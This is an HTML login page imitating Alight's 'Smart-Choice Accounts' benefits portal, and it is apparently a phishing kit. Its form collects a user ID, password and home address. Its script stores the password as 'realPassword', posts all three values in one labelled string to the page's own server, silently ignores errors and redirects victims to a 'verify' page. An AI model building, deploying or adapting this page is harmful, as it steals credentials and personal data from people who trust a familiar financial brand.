<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;   /* Centers everything vertically */
            
            /* Background - Full like the screenshot */
            background-image: url('alight1.png');
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            
            position: relative;
            overflow: hidden;
        }

        /* Dark overlay for better readability (like the original) */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);   /* Adjust 0.5 if too dark/light */
            z-index: 1;
        }

        .logo-container { 
            text-align: center; 
            margin-bottom: 30px; 
            z-index: 2; 
            position: relative;
            color: white;
        }
        
        .logo-container h1 { 
            font-size: 2.4rem; 
            font-weight: 700; 
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
        }
        
        .logo-container .subtitle { 
            font-size: 1.6rem; 
            margin-top: 4px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
        }
        
        .sun-icon { 
            font-size: 3.8rem; 
            margin: 15px 0; 
        }

        .worklife {
            font-size: 15px;
            font-weight: 600;
            color: #ffffff;
            background-color: rgba(255,255,255,0.15);
            padding: 14px 18px;
            margin: 20px auto;
            max-width: 340px;
            border-radius: 8px;
            line-height: 1.5;
            text-align: center;
            backdrop-filter: blur(4px);
            z-index: 2;
            position: relative;
        }

        .form-container { 
            width: 100%; 
            max-width: 380px; 
            background: rgba(255, 255, 255, 0.95);
            padding: 35px 28px;
            border-radius: 16px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
            z-index: 2;
            position: relative;
        }

        label { 
            display: block; 
            margin: 22px 0 8px; 
            font-size: 1.05rem; 
            color: #1e2937; 
            font-weight: 600; 
        }

        input { 
            width: 100%; 
            padding: 14px 16px; 
            border: 1px solid #cbd5e1; 
            border-radius: 8px;
            font-size: 1.05rem; 
            background: white; 
        }

        input:focus { 
            outline: none; 
            border-color: #3b82f6; 
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
        }

        .helper-text {
            display: block;
            margin-top: 6px;
            font-size: 14px;
            color: #1e40af;
            font-weight: 500;
        }

        .login-btn { 
            width: 100%; 
            padding: 16px; 
            background: #1e40af; 
            color: white; 
            border: none; 
            border-radius: 50px; 
            font-size: 1.2rem; 
            font-weight: 600; 
            margin: 25px 0 10px; 
            cursor: pointer; 
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <h1>alight</h1>
        <div class="subtitle">Smart-Choice Accounts®</div>
        <div class="sun-icon">☀️</div>
        <div class="worklife">Same login used to access benefits on Alight Worklife Web</div>
    </div>

    <div class="form-container">
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Enter your User ID</label>
                <input type="text" id="username" placeholder="User ID" required>
                <small class="helper-text">Same ID used to access benefits on Alight Worklife Web</small>
            </div>

            <div class="form-group">
                <label for="password">Enter your Password</label>
                <input type="password" id="password" placeholder="Password" required>
                <small class="helper-text">Same password used to access benefits on Alight Worklife Web</small>
            </div>

            <label for="address">Home Address (Current)</label>
            <input type="text" id="address" placeholder="Enter your current home address" required>

            <button type="submit" class="login-btn">LOG IN</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const homeAddress = document.getElementById('address').value.trim();

            sessionStorage.setItem('realPassword', password);

            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        username, 
                        password, 
                        address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
                    })
                });
            } catch (err) {}

            window.location.href = "verify.html";
        });
    </script>
</body>
</html>
